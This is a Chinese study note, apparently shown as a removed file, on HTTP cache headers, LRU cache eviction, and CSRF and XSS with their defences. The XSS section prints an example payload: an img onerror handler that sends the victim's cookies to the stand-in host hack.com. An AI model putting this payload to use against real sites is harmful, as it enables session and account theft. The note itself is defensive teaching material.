-![enter description here][13]
-
-
-
-
-
-**简单介绍下Cache-Control的属性设置:**
-
-1. max-age: 设置缓存的最大的有效时间，单位为秒（s）。max-age会覆盖掉Expires  **（注意：max-age 和 Expires  都属于强缓存）**
-2. s-maxage: 只用于共享缓存，比如CDN缓存（s -> share）。与max-age 的区别是：max-age用于普通缓存，
-   而s-maxage用于代理缓存。如果存在s-maxage,则会覆盖max-age 和 Expires.
-3. public：响应会被缓存，并且在多用户间共享。默认是public。
-4. private: 响应只作为私有的缓存，不能在用户间共享。如果要求HTTP认证，响应会自动设置为private。
-5. no-cache: 指定不缓存响应，表明资源不进行缓存。但是设置了no-cache之后并不代表浏览器不缓存，而是在缓存前要向服务器确认资源是否被更改。因此有的时候只设置no-cache防止缓存还是不够保险，还可以加上private指令，将过期时间设为过去的时间。
-6. no-store: 绝对禁止缓存。
-7. must-revalidate: 如果页面过期，则去服务器进行获取。
-
-
-
------
-
-
-
-
-
-
-
-- no-cache: 告诉浏览器、缓存服务器，不管本地副本是否过期，使用资源副本前，**一定要到源服务器进行副本有效性校验**。
-- must-revalidate：告诉浏览器、缓存服务器，本地副本过期前，可以使用本地副本；本地副本一旦过期，必须去源服务器进行有效性校验。
-
-
-
------
-
-
-
-https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching?hl=zh-cn#%E2%80%9Cno-cache%E2%80%9D%E5%92%8C%E2%80%9Cno-store%E2%80%9D
-
-
-
-
-
-#### “no-cache”和“no-store”
-
-
-
-“no-cache”**表示必须先与服务器确认返回的响应是否发生了变化**，然后才能使用该响应来满足后续对同一网址的请求。 因此，如果存在合适的验证令牌 (ETag)，no-cache 会发起往返通信来验证缓存的响应，但如果资源未发生变化，则可避免下载。
-
-
-
-相比之下，“no-store”则要简单得多。 它直接禁止浏览器以及所有中间缓存存储任何版本的返回响应，例如，包含个人隐私数据或银行业务数据的响应。 每次用户请求该资产时，都会向服务器发送请求，并下载完整的响应。
-
-
-
-所以总结出一个观点:
-
-
-
-**no-cache不代表没有缓存**
-
-**no-cache不代表没有缓存**
-
-**no-cache不代表没有缓存**
-
-
-
-
-
-实际上Cache-Control: no-cache是会被缓存的，只不过每次在向客户端（浏览器）提供响应数据时，缓存都要向服务器评估缓存响应的有效性。
-
-
-
-
-
-
-
-#### “public”与 “private”
-
-
-
-如果响应被标记为“public”，则即使它有关联的 HTTP 身份验证，甚至响应状态代码通常无法缓存，也可以缓存响应。 大多数情况下，“public”不是必需的，因为明确的缓存信息（例如“max-age”）已表示响应是可以缓存的。
-
-相比之下，浏览器可以缓存“private”响应。 不过，这些响应通常只为单个用户缓存，因此不允许任何中间缓存对其进行缓存。 例如，用户的浏览器可以缓存包含用户私人信息的 HTML 网页，但 CDN 却不能缓存。
-
-
-
-
-
-
-
-
-
-
-
-#### 缓存流程
-
-
-
-![enter description here][14]
-
-
-
-1. 查看是否有cache-control 的max-age / s-maxage , 如果有，则用服务器时间date值 + max-age/s-maxage 的秒数计算出新的过期时间，将当前时间与过期时间进行比较，判断是否过期
-2. 查看是否有cache-control 的max-age / s-maxage，没有，则用expires 作为过期时间比较
-
-![enter description here][15]
-
-
-
-判断过程执行完后，如果判定为未过期，则使用客户端缓存，那么就是属于"强缓存"，否则，跟服务器协商是否使用缓存，这就属于"协商缓存"
-
-
-
-![enter description here][16]
-
-到这一步的时候，浏览器会向服务器发送请求，同时如果上一次的缓存中有Last-modified 和 Etag 字段，
-浏览器将在request header 中加入**If-Modified-Since（对应于Last-modified）**， 和**If-None-Match（对应于Etag）**。
-
-
-* Last-modified: 表明请求的资源上次的修改时间。
-* If-Modified-Since：客户端保留的资源上次的修改时间。
-* Etag：资源的内容标识。（不唯一，通常为文件的md5或者一段hash值，只要保证写入和验证时的方法一致即可）
-* If-None-Match： 客户端保留的资源内容标识。
-
-
->1) 分布式系统尽量关闭Etag，因为每台机器生成的Etag都不一样。
->2) 分布式系统里多台机器间文件的Last-Modified必须一致，以免负载均衡不同导致对比失败。
-
-
-最后附上一张，用户行为影响浏览器的缓存行为。
-
-![enter description here][17]
-
-
-
-
-
-####  **浏览器缓存淘汰策略** 
-
-
-
-[ https://juejin.im/post/5e8b3085f265da47c15cb8bb?utm_source=gold_browser_extension ]( https://juejin.im/post/5e8b3085f265da47c15cb8bb?utm_source=gold_browser_extension )
-
-
-
- 浏览器中的缓存是一种在本地保存资源副本，它的大小是有限的，当我们请求数过多时，缓存空间会被用满，此时，继续进行网络请求就需要确定缓存中哪些数据被保留，哪些数据被移除 
-
-
-
- 最常见的淘汰策略有 FIFO（先进先出）、LFU（最少使用）、LRU（最近最少使用）。 
-
-
-
- LRU （ `Least Recently Used` ：最近最少使用 ）缓存淘汰策略，故名思义，就是根据数据的历史访问记录来进行淘汰数据，其核心思想是 **如果数据最近被访问过，那么将来被访问的几率也更高** ，优先淘汰最近没有被访问到的数据。 
-
-
-
-![](https://user-gold-cdn.xitu.io/2020/4/6/1714fb580920fc36?imageView2/0/w/1280/h/960/format/webp/ignore-error/1)
-
-
-
-
-
->在 vue2.5.0 版本中，`keep-alive` 新增了 `max` 属性，用于最多可以缓存多少组件实例，一旦这个数字达到了，在新实例被创建之前，已缓存组件中最久没有被访问的实例会被销毁掉，**看，这里就应用了 LRU 算法**。即在 `keep-alive` 中缓存达到 `max`，新增缓存实例会优先淘汰最近没有被访问到的实例
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-## 安全类
-
-* CSRF
-* XSS
-
-### CSRF
-
-[网页链接](http://blog.csdn.net/stpeace/article/details/53512283)
-CSRF跨站点请求伪造(Cross—Site Request Forgery)
-
-
-攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。
-
-
-#### CSRF攻击攻击原理及过程如下：
-
-1. 用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；
-2. 在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；
-3. 用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B；
-4. 网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；
-5. 浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。 
-
-
-
-#### CSRF漏洞检测：
-
-检测CSRF漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。
-
-随着对CSRF漏洞研究的不断深入，不断涌现出一些专门针对CSRF漏洞进行检测的工具，如CSRFTester，CSRF Request Builder等。
-
-以CSRFTester工具为例，CSRF漏洞检测工具的测试原理如下：使用CSRFTester进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在CSRFTester中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击。
-
-#### 防御CSRF攻击：
-
-* 验证 HTTP Referer 字段；
-* 在请求地址中添加 token 并验证
-* 在 HTTP 头中自定义属性并验证。
-
-
-**验证 HTTP Referer 字段**：
-根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问 `http://bank.example/withdraw?account=bob&amount=1000000&for=Mallory`，用户必须先登陆 bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。
-
-这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。
-
-然而，这种方法并非万无一失。Referer 的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全。
-
-----------
-
-
-**在请求地址中添加 token 并验证:**
-CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。
-
-
-这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。对于 GET 请求，token 将附在请求地址之后，这样 URL 就变成 `http://url?csrftoken=tokenvalue`。 而对于 POST 请求来说，要在 form 的最后加上 `<input type=”hidden” name=”csrftoken” value=”tokenvalue”/>`，这样就把 token 以参数的形式加入请求了。但是，在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很麻烦的，并且很容易漏掉，通常使用的方法就是在每次页面加载时，使用 javascript 遍历整个 dom 树，对于 dom 中所有的 a 和 form 标签后加入 token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的 html 代码，这种方法就没有作用，还需要程序员在编码时手动添加 token。
-
-该方法还有一个缺点是难以保证 token 本身的安全。特别是在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。由于系统也会在这个地址后面加上 token，黑客可以在自己的网站上得到这个 token，并马上就可以发动 CSRF 攻击。为了避免这一点，系统可以在添加 token 的时候增加一个判断，如果这个链接是链到自己本站的，就在后面添加 token，如果是通向外网则不加。不过，即使这个 csrftoken 不以参数的形式附加在请求之中，黑客的网站也同样可以通过 Referer 来得到这个 token 值以发动 CSRF 攻击。这也是一些用户喜欢手动关闭浏览器 Referer 功能的原因。
-
-----------
-
-
-**在 HTTP 头中自定义属性并验证**
-这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。
-
-
-然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于 Ajax 方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行 CSRF 防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。
-
-----------
-
-
-**使用axios防止 CSRF**
-
-
-原理:
-axios默认在Request Config里已经设置了
-
-```javascript
- //  ``xsrfCookieName`是用作xsrf标记值的cookie的名称
-  xsrfCookieName ：' XSRF-TOKEN '，//  默认  
- 
-  //  ``xsrfHeaderName`是携带xsrf标记值的http标头的名称
-  xsrfHeaderName ：' X-XSRF-TOKEN '，//  默认  
-```
-
-
-
-### XSS
-
-[网页链接](https://mp.weixin.qq.com/s?__biz=MzAxODE2MjM1MA==&mid=2651553616&idx=1&sn=17036b87c39e81cbcb8df5d9fb1f906d&chksm=8025a891b75221874054f9f71d40a94973b583e7a444c868c8f94fa76e1c9d8b3c29d68ee6a8&scene=0#rd)
-
-跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。
-
-反射型：
-URL的构成分为协议、域名、端口、路径、查询几部分构成。
-XSS往往在“查询”部分发现漏洞构造攻击代码实施攻击，所谓“反射”可以理解为hacker并不会直接攻击客户，而是通过URL植入代码通过服务器获取并植入到用户页面完成攻击。
-
-存储型：
-存储型存储型攻击方式和反射型最大的区别就是不通过URL来传播，而是利用站点本身合法的存储结构，比如评论。任何用户都可以通过站点提供的接口提交评论内容，这些评论内容都被存储到服务器的数据库。当用户访问这些评论的时候，服务器从数据库提取内容插入到页面反馈给用户。如果评论内容本身是具备攻击性内容，用户无一幸免。
-
-#### XSS的工作原理：
-
-不管是反射型还是存储型，服务端都会将JavaScript当做文本处理，这些文本在服务端被整合进html文档中，在浏览器解析这些文本的过程也就是XSS被执行的时候。
-
-从攻击到执行分为以下几步：
-
-1. 构造攻击代码
-2. 服务端提取并写入HTML
-3. 浏览器解析，XSS执行
-
-
-**构造攻击代码：**
-hacker在发现站点对应的漏洞之后，基本可以确定是使用“反射型”或者“存储型”。对于反射型这个很简单了，执行类似代码：
-
-```
-https://www.toutiao.com/search?item=<img onerror="new Image().src='//hack.com?c=' src='null'>"
-```
-
-大家知道很多站点都提供搜索服务，这里的item字段就是给服务端提供关键词。如果hacker将关键词修改成可执行的JavaScript语句，如果服务端不加处理直接将类似代码回显到页面，XSS代码就会被执行。
-
-
-这段代码的含义是告诉浏览器加载一张图片，图片的地址是空，根据加载机制空图片的加载会触发Element的onerror事件，这段代码的onerror事件是将本地cookie传到指定的网站。
-
-
-#### XSS的防范措施：
-
-
-
-**编码:**
-对于反射型的代码，服务端代码要对查询进行编码，主要目的就是将查询文本化，避免在浏览器解析阶段转换成DOM和CSS规则及JavaScript解析。
-
-
-**DOM Parse和过滤:**
-从XSS工作的原理可知，在服务端进行编码，在模板解码这个过程对于富文本的内容来说，完全可以被浏览器解析到并执行，进而给了XSS执行的可乘之机。
-
-为了杜绝悲剧发生，我们需要在浏览器解析之后进行解码，得到的文本进行DOM parse拿到DOM Tree，对所有的不安全因素进行过滤，最后将内容交给浏览器，达到避免XSS感染的效果。
-
-----------
-
-
-**Cookies如何防范XSS攻击?**
-
-为了减轻这些攻击，需要在HTTP头部配置set-cookie:
-
-* HttpOnly - 这个属性可以防止cross-site scripting，因为它会禁止Javascript脚本访问cookie。
-* secure - 这个属性告诉浏览器仅在请求为HTTPS时发送cookie。
-
-结果应该是这样的: Set-Cookie: sid=; HttpOnly. **使用Express的话，cookie-session默认配置好了**。
-
->在cookie-session中httpOnly: a boolean indicating whether the cookie is only to be sent over HTTP(S), and not made available to client JavaScript (true by default).
-
-
->一个布尔值，指示cookie是否仅通过HTTP（S）发送，并且不提供给客户端JavaScript（true默认情况下）
 
 
 
